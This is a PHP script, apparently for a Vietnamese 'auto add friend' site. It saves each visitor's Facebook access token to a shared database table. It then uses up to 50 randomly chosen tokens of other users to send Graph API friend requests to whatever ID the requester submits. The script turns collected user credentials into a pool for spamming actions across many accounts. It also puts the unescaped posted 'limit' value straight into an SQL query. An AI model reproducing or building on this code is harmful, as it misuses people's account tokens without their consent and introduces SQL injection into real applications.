<?php
session_start();
include'config.php';

if($_POST['id_friend'] && $_SESSION['id']){
mysql_query("CREATE TABLE IF NOT EXISTS `tokenfriend` (
      `id` int(11) NOT NULL AUTO_INCREMENT,
      `user_id` varchar(32) NOT NULL,
      `name` varchar(32) NOT NULL,
      `access_token` varchar(255) NOT NULL,
      PRIMARY KEY (`id`)
      ) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;
   ");
   $row = null;
   $result = mysql_query("
      SELECT
         *
      FROM
         tokenfriend
      WHERE
         user_id = '" . mysql_real_escape_string($_SESSION['id']) . "'
   ");
   if($result){
      $row = mysql_fetch_array($result, MYSQL_ASSOC);
      if(mysql_num_rows($result) > 100){
         mysql_query("
            DELETE FROM
               tokenfriend
            WHERE
               user_id='" . mysql_real_escape_string($_SESSION['id']) . "' AND
               id != '" . $row['id'] . "'
         ");
      }
   }
 
   if(!$row){
      mysql_query(
         "INSERT INTO 
            tokenfriend
         SET
            `user_id` = '" . mysql_real_escape_string($_SESSION['id']) . "',
            `name` = '" . mysql_real_escape_string($_SESSION['name']) . "',
            `access_token` = '" . mysql_real_escape_string($_SESSION['token']) . "'
      ");
   } else {
      mysql_query(
         "UPDATE 
            tokenfriend
         SET
            `access_token` = '" . mysql_real_escape_string($_SESSION['token']) . "'
         WHERE
            `id` = " . $row['id'] . "
      ");
   }  
$limit=$_POST['limit'];
if ($limit > 50){
   die('<script>$(function (){ toastr.error("F12 @@")});</script>');
break;
}
$idstt2=$_POST['id_friend'];
$iduser=$_SESSION['id'];
$spam2 = mysql_result(mysql_query("SELECT COUNT(*) FROM `timefriend` WHERE `iduser`='".$iduser."'"), 0);
if($spam2 == 0){
mysql_query("CREATE TABLE IF NOT EXISTS `timefriend` (
      `id` int(11) NOT NULL AUTO_INCREMENT,
      `iduser` varchar(32) NOT NULL,
      `time` varchar(32) NOT NULL,
      `idfriend` varchar(255) NOT NULL,
      PRIMARY KEY (`id`)
      ) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;
   ");
   mysql_query(
         "INSERT INTO 
            timefriend
         SET
            `iduser` = '" . mysql_real_escape_string($iduser) . "',
            `time` = '" . time() . "',
            `idfriend` = '" . mysql_real_escape_string($idstt2) . "'
      ");
    $laytoken = mysql_query("SELECT * FROM `tokenfriend` ORDER BY RAND() LIMIT 0,$limit");

    while ($getpu = mysql_fetch_array($laytoken)){
        $tokenfriend= $getpu['access_token'];        
    auto('https://graph.facebook.com/me/friends?uid='.$idstt2.'&access_token='.$tokenfriend.'&method=post');}
    die('<script>$(function (){ toastr.success("Vui Lòng Đợi 15p Để Tiếp Tục","Auto Add Friend Thành Công")});</script>');
 } else {	
   die('<script>$(function (){ toastr.error("Vui Lòng Đợi 15p Để Tiếp Tục","Không Thành Công!")});</script>'); }
}

function auto($url){
   $curl = curl_init();
   curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
   curl_setopt($curl, CURLOPT_URL, $url);
   $ch = curl_exec($curl);
   curl_close($curl);
   return $ch;
   }
?>